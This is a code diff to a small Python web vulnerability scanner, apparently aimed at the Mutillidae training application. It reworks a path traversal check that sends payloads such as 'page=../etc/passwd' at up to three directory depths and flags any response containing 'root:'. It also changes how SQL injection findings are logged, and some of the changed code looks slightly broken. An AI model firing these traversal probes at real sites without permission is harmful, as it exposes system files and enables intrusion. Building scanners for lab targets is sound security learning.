@@ -16,6 +16,10 @@ def read_file(name):
         sql_inject(name, line)
 
 
+"""
+SQL injection Function
+"""
+
 def sql_inject(name, link):
 
     root_folder = 'sites'
@@ -34,12 +38,16 @@ def sql_inject(name, link):
 
     for x in errors:
         if x in page:
-            g = open(newfile, 'w')
+            g = open(newfile, 'a')
 
             g.write(
                 "\033[01;31mVulnerability Found in: \033[00m\n"
                 "\033[01;31m[*] SQL Injection Found : "+link + "\033[00m\n"
             )
+
+"""
+Path Traversal Function
+"""
 
 
 def path_traversal(name):
@@ -50,33 +58,55 @@ def path_traversal(name):
     f = open(path, 'r')
 
     for line in f:
+
+        contains = "root:"
         if "page=" in line:
+
+            newfile = root_folder + "/" + name + "/" + "pathtraversal.txt"
+            g = open(newfile, "a")
             page = "page=".join(line.split("page=")[:-1])
-            print(page)
 
             q1 = page+"page=../etc/passwd"
-            #request = urllib.urlopen(q1)
-            if q1.code != 200:
+            request = urllib.urlopen(q1)
+            res = request.read()
+
+            if contains in res:
+
+                found = "\033[01;31m[+] Path Traversal Found : " + q1 + "\033[00m\n"
+                g.write(found + "\n")
+                print(found)
+
+            else:
+                notfound = "[*] Path Traversal Not Found : " + q1
+                g.write(notfound+"\n")
+                print(notfound)
+
                 q2 = page + "page=../../etc/passwd"
-                # request = urllib.urlopen(q2)
-            else:
-                print("\033[01;31m[*] Path Traversal Found : " + q1 + "\033[00m\n")
+                request = urllib.urlopen(q2)
+                res2 = request.read()
+                if contains in res2:
+                    found = "\033[01;31m[+] Path Traversal Found : " + q2 + "\033[00m\n"
+                    g.write(found + "\n")
+                    print(found)
 
-            if q2.code != 200:
-                q3 = page + "page=../../../etc/passwd"
-                # request = urllib.urlopen(q3)
-            else:
-                print("\033[01;31m[*] Path Traversal Found : " + q2 + "\033[00m\n")
+                else:
+                    notfound = "[*] Path Traversal Not Found : " + q2
+                    g.write(notfound + "\n")
+                    print(notfound)
 
-            if q3 != 200:
-                q4 = page + "page=../../../../etc/passwd"
-                # request = urllib.urlopen(q4)
-            else:
-                print("\033[01;31m[*] Path Traversal Found : " + q3 + "\033[00m\n")
+                    q3 = page + "page=../../../etc/passwd"
+                    request = urllib.urlopen(q3)
+                    res3 = request.read()
+                    if contains in res3:
+                        found = "\033[01;31m[+] Path Traversal Found : " + q3 + "\033[00m\n"
+                        g.write(found + "\n")
+                        print(found)
 
-            if q4 != 200:
-                print("[-] Path Traversal Not Found :")
-            else:
-                print("\033[01;31m[*] Path Traversal Found : " + q3 + "\033[00m\n")
+
+                    else:
+                        notfound = "[*] Path Traversal Not Found : " + q3
+                        g.write(notfound + "\n")
+                        print(notfound)
+        g.close()
 
 path_traversal("MUTILLIDAE")
